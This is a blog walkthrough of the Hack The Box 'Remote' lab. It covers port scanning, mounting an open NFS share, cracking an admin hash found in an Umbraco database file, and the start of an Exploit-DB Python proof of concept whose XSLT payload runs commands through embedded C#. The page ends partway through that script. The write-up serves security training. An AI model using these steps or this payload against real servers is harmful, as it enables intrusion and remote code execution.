<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Mounting the NFS and got a sfd file which contains a hash and cracking it with john and logged in to umbraco and after searching an exploit for it got a RCE and shell as user , abusing service uSoSvc got shell as administrator." /><meta property="og:title" content="Hackthebox Remote writeup" /><meta property="og:description" content="Mounting the NFS and got a sfd file which contains a hash and cracking it with john and logged in to umbraco and after searching an exploit for it got a RCE and shell as user , abusing service uSoSvc got shell as administrator." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/remote/remote.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Remote writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Mounting the NFS and got a sfd file which contains a hash and cracking it with john and logged in to umbraco and after searching an exploit for it got a RCE and shell as user , abusing service uSoSvc got shell as administrator."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/remote/remote.png"><title>Hackthebox Remote writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Remote writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Remote writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 22, 2020, 12:00 AM +0800" > Mar 22 <i class="unloaded">2020-03-22T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/remote/remote.png" class="post-preview-img"><h1 id="informationremote">information@remote:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Remote<tr><td>Points<td>20<tr><td>Os<td>Windows<tr><td>Difficulty<td>easy<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/2984">mrb3n</a><tr><td>Out On<td>21 march 2020<tr><td>creator’s Twitter<td><a href="https://twitter.com/mrb3n813">@mrb3n813</a></table></div><h1 id="briefremote">Brief@remote:~$</h1><p>An easy box start with <code class="language-plaintext highlighter-rouge">Mounting</code> the <code class="language-plaintext highlighter-rouge">NFS</code> and got a sfd file which contains a <strong>hash</strong> and <code class="language-plaintext highlighter-rouge">cracking</code> it with <strong>john</strong> and logged in to <code class="language-plaintext highlighter-rouge">umbraco</code> and after searching an exploit for it got a <code class="language-plaintext highlighter-rouge">RCE</code> and shell as user , abusing service <code class="language-plaintext highlighter-rouge">uSoSvc</code> got shell as <strong>administrator</strong>.</p><h1 id="summary">Summary</h1><ul><li>mounting the <code class="language-plaintext highlighter-rouge">nfs</code>.<li>Getting the <code class="language-plaintext highlighter-rouge">.sdf</code> file<li>Reading contents of file and Cracking the <strong>password</strong> hash using john<li>Getting the login page for the <code class="language-plaintext highlighter-rouge">umbraco</code> application<li>Finding the exploit and modifying it to for rce<li>Getting shell as <code class="language-plaintext highlighter-rouge">apppool\defaultapppool</code><li><code class="language-plaintext highlighter-rouge">Getting user.txt</code><li>Absuing the <code class="language-plaintext highlighter-rouge">uSoSvc</code> service<li>Getting shell as administrator<li><code class="language-plaintext highlighter-rouge">Getting root.txt</code></ul><h1 id="rooted">Rooted</h1><h1 id="got-root">Got root</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/remote/remote.cast" autoplay="1" start-at="00:22" speed="5" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre><td class="rouge-code"><pre>Nmap 7.80 scan initiated Sun Mar 22 07:12:43 2020 as: nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-oA</span> nmap 10.10.10.180
Warning: 10.10.10.180 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>10.10.10.180
Host is up <span class="o">(</span>0.33s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65519 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h32m11s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2020-03-22T02:19:40
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Mar 22 07:49:25 2020 -- 1 IP address (1 host up) scanned in 2202.16 seconds</span>
</pre></table></code></div></div><p>So many ports are opened Lets Start with port <code class="language-plaintext highlighter-rouge">80</code></p><h3 id="port-80">port 80</h3><p><a href="/hackthebox/remote/image-1.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/remote/image-1.png" alt="port-80" /></a></p><p>So After wasting my time on port 80 i decided to run gobuster on it And while the gobutser is running lets move on to next port</p><h2 id="gobuster">gobuster</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>➜  remote git:<span class="o">(</span>master<span class="o">)</span> ✗ gobuster <span class="nb">dir</span> <span class="nt">-u</span> remote.htb <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://remote.htb
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/03/22 16:45:11 Starting gobuster
<span class="o">===============================================================</span>
/contact <span class="o">(</span>Status: 200<span class="o">)</span>
/blog <span class="o">(</span>Status: 200<span class="o">)</span>
/products <span class="o">(</span>Status: 200<span class="o">)</span>
/home <span class="o">(</span>Status: 200<span class="o">)</span>
/people <span class="o">(</span>Status: 200<span class="o">)</span>
/Home <span class="o">(</span>Status: 200<span class="o">)</span>
/Products <span class="o">(</span>Status: 200<span class="o">)</span>
/Contact <span class="o">(</span>Status: 200<span class="o">)</span>
/install <span class="o">(</span>Status: 302<span class="o">)</span>
</pre></table></code></div></div><p>The dir /install looked very interesting When i visited it ,I was redirected to a login page Cool</p><p><a href="/hackthebox/remote/image-2.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/remote/image-2.png" alt="Login page" /></a></p><h3 id="port-111-rpcbind">Port 111 (Rpcbind)</h3><p>The nfs <code class="language-plaintext highlighter-rouge">Network File System</code> Service is ruuning on the port and we can use a utility called <code class="language-plaintext highlighter-rouge">showmount</code> from the tool <code class="language-plaintext highlighter-rouge">nfs-common</code> and you can simply install it with</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>apt <span class="nb">install </span>nfs-common
</pre></table></code></div></div><p>Now i can list the storage available on nfs</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>➜  remote git:<span class="o">(</span>master<span class="o">)</span> ✗ showmount <span class="nt">-e</span> remote.htb             
Export list <span class="k">for </span>remote.htb:
/site_backups <span class="o">(</span>everyone<span class="o">)</span>
</pre></table></code></div></div><p>So i got a site_backup dir which is available for everyone cool !! Now i will mount this dir to my machine to read and transfer contents from it</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">mkdir </span>mnt <span class="o">&amp;&amp;</span> mount <span class="nt">-t</span> nfs remote.htb:/site_backups ./mnt
</pre></table></code></div></div><p>This will mount the site_backups dir to my mnt dir that i had created</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>drwxr-xr-x  2 root root    4096 Mar 22 08:12 mnt
</pre></table></code></div></div><p>Simply move to it And can check the files and its content</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>➜  mnt <span class="nb">ls</span> <span class="nt">-la</span>
total 123
drwx------ 2 nobody 4294967294  4096 Feb 24 03:35 <span class="nb">.</span>
drwxr-xr-x 3 root   root        4096 Mar 22 17:59 ..
drwx------ 2 nobody 4294967294    64 Feb 21 02:16 App_Browsers
drwx------ 2 nobody 4294967294  4096 Feb 21 02:17 App_Data
drwx------ 2 nobody 4294967294  4096 Feb 21 02:16 App_Plugins
drwx------ 2 nobody 4294967294    64 Feb 21 02:16 aspnet_client
drwx------ 2 nobody 4294967294 49152 Feb 21 02:16 bin
drwx------ 2 nobody 4294967294  8192 Feb 21 02:16 Config
drwx------ 2 nobody 4294967294    64 Feb 21 02:16 css
<span class="nt">-rwx------</span> 1 nobody 4294967294   152 Nov  2  2018 default.aspx
<span class="nt">-rwx------</span> 1 nobody 4294967294    89 Nov  2  2018 Global.asax
drwx------ 2 nobody 4294967294  4096 Feb 21 02:16 Media
drwx------ 2 nobody 4294967294    64 Feb 21 02:16 scripts
drwx------ 2 nobody 4294967294  8192 Feb 21 02:16 Umbraco
drwx------ 2 nobody 4294967294  4096 Feb 21 02:16 Umbraco_Client
drwx------ 2 nobody 4294967294  4096 Feb 21 02:16 Views
<span class="nt">-rwx------</span> 1 nobody 4294967294 28539 Feb 20 14:57 Web.config
</pre></table></code></div></div><p>After spending &lt;= 15 mins i got a file called <code class="language-plaintext highlighter-rouge">Umbraco.sdf</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>➜  App_Data <span class="nb">ls</span> <span class="nt">-la</span>
total 1977
drwx------ 2 nobody 4294967294    4096 Feb 21 02:17 <span class="nb">.</span>
drwx------ 2 nobody 4294967294    4096 Feb 24 03:35 ..
drwx------ 2 nobody 4294967294      64 Feb 21 02:16 cache
drwx------ 2 nobody 4294967294    4096 Feb 21 02:16 Logs
drwx------ 2 nobody 4294967294    4096 Feb 21 02:16 Models
drwx------ 2 nobody 4294967294      64 Feb 21 02:16 packages
drwx------ 2 nobody 4294967294    4096 Feb 21 02:16 TEMP
<span class="nt">-rwx------</span> 1 nobody 4294967294   36832 Feb 20 15:59 umbraco.config
<span class="nt">-rwx------</span> 1 nobody 4294967294 1965978 Feb 20 15:05 Umbraco.sdf
</pre></table></code></div></div><p>I searched for any <code class="language-plaintext highlighter-rouge">online sdf file viewer</code> but didnt find any !!</p><p>So i opened it via it my <code class="language-plaintext highlighter-rouge">visual studio code</code> and got a line in the file at the top</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
</span></pre></table></code></div></div><p>It doesnt took me much time to get and identify the <code class="language-plaintext highlighter-rouge">sha1</code> hash starting after admin@htb.local</p><p><code class="language-plaintext highlighter-rouge">b8be16afba8c314ad33d812f22a04991b90e2aaa</code></p><p>I confirmed the hash via <code class="language-plaintext highlighter-rouge">hash-identifier</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>➜  prashant git:<span class="o">(</span>master<span class="o">)</span> ✗ hash-identifier 
   <span class="c">#########################################################################</span>
   <span class="c">#     __  __                     __           ______    _____           #</span>
   <span class="c">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
   <span class="c">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
   <span class="c">#     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
   <span class="c">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
   <span class="c">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
   <span class="c">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
   <span class="c">#                                                             By Zion3R #</span>
   <span class="c">#                                                    www.Blackploit.com #</span>
   <span class="c">#                                                   Root@Blackploit.com #</span>
   <span class="c">#########################################################################</span>
<span class="nt">--------------------------------------------------</span>
 HASH: b8be16afba8c314ad33d812f22a04991b90e2aaa

Possible Hashs:
<span class="o">[</span>+] SHA-1
<span class="o">[</span>+] MySQL5 - SHA-1<span class="o">(</span>SHA-1<span class="o">(</span><span class="nv">$pass</span><span class="o">))</span>
</pre></table></code></div></div><h1 id="cracking-hash">Cracking Hash</h1><p>Now i copied the hash in a file <code class="language-plaintext highlighter-rouge">hash.txt</code> and next step is to crack it via <code class="language-plaintext highlighter-rouge">john</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>➜  remote git:<span class="o">(</span>master<span class="o">)</span> ✗ john hash.txt <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt 
Warning: detected <span class="nb">hash type</span> <span class="s2">"Raw-SHA1"</span>, but the string is also recognized as <span class="s2">"Raw-SHA1-AxCrypt"</span>
Use the <span class="s2">"--format=Raw-SHA1-AxCrypt"</span> option to force loading these as that <span class="nb">type </span>instead
Warning: detected <span class="nb">hash type</span> <span class="s2">"Raw-SHA1"</span>, but the string is also recognized as <span class="s2">"Raw-SHA1-Linkedin"</span>
Use the <span class="s2">"--format=Raw-SHA1-Linkedin"</span> option to force loading these as that <span class="nb">type </span>instead
Warning: detected <span class="nb">hash type</span> <span class="s2">"Raw-SHA1"</span>, but the string is also recognized as <span class="s2">"ripemd-160"</span>
Use the <span class="s2">"--format=ripemd-160"</span> option to force loading these as that <span class="nb">type </span>instead
Warning: detected <span class="nb">hash type</span> <span class="s2">"Raw-SHA1"</span>, but the string is also recognized as <span class="s2">"has-160"</span>
Use the <span class="s2">"--format=has-160"</span> option to force loading these as that <span class="nb">type </span>instead
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-SHA1 <span class="o">[</span>SHA1 128/128 XOP 4x2]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>4
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
baconandcheese   <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:02 DONE <span class="o">(</span>2020-03-22 18:18<span class="o">)</span> 0.4545g/s 4465Kp/s 4465Kc/s 4465KC/s baconandchipies1..bacon918
Use the <span class="s2">"--show --format=Raw-SHA1"</span> options to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>We got it Cracked <code class="language-plaintext highlighter-rouge">baconandcheese</code></p><p>Now we can login using <code class="language-plaintext highlighter-rouge">admin@htb.local</code> and <code class="language-plaintext highlighter-rouge">baconandcheese</code></p><h1 id="login-as-admin">Login as admin</h1><p><a href="/hackthebox/remote/image-3.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/remote/image-3.png" alt="admin-panel" /></a></p><p>Now before doing something i decided to find any exploit for the <code class="language-plaintext highlighter-rouge">Umbraco version 7.12.4</code></p><p>And yes i got a possible exploit</p><p><a href="https://www.exploit-db.com/exploits/46153">https://www.exploit-db.com/exploits/46153</a></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span><span class="p">;</span>

<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span><span class="p">;</span>

<span class="k">def</span> <span class="nf">print_dict</span><span class="p">(</span><span class="n">dico</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="n">dico</span><span class="p">.</span><span class="n">items</span><span class="p">());</span>
    
<span class="k">print</span><span class="p">(</span><span class="s">"Start"</span><span class="p">);</span>

<span class="c1"># Execute a calc for the PoC
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'&lt;?xml version="1.0"?&gt;&lt;xsl:stylesheet version="1.0" </span><span class="se">\
</span><span class="s">xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" </span><span class="se">\
</span><span class="s">xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"&gt;</span><span class="se">\
</span><span class="s">&lt;msxsl:script language="C#" implements-prefix="csharp_user"&gt;public string xml() </span><span class="se">\
</span><span class="s">{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();</span><span class="se">\
</span><span class="s"> proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;</span><span class="se">\
</span><span class="s"> proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; </span><span class="se">\
</span><span class="s"> proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } </span><span class="se">\
</span><span class="s"> &lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="csharp_user:xml()"/&gt;</span><span class="se">\
</span><span class="s"> &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; '</span><span class="p">;</span>

<span class="n">login</span> <span class="o">=</span> <span class="s">"XXXX"</span><span class="p">;</span>
<span class="n">password</span><span class="o">=</span><span class="s">"XXXX"</span><span class="p">;</span>
<span class="n">host</span> <span class="o">=</span> <span class="s">"XXXX"</span><span class="p">;</span>


<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">url_main</span> <span class="o">=</span><span class="n">host</span><span class="o">+</span><span class="s">"/umbraco/"</span><span class="p">;</span>
<span class="n">r1</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_main</span><span class="p">);</span>
<span class="n">print_dict</span><span class="p">(</span><span class="n">r1</span><span class="p">.</span><span class="n">cookies</span><span class="p">);</span>


<span class="n">url_login</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s">"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"</span><span class="p">;</span>
<span class="n">loginfo</span> <span class="o">=</span> <span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">login</span><span class="p">,</span><span class="s">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">};</span>
<span class="n">r2</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">loginfo</span><span class="p">);</span>


<span class="n">url_xslt</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s">"/umbraco/developer/Xslt/xsltVisualize.aspx"</span><span class="p">;</span>
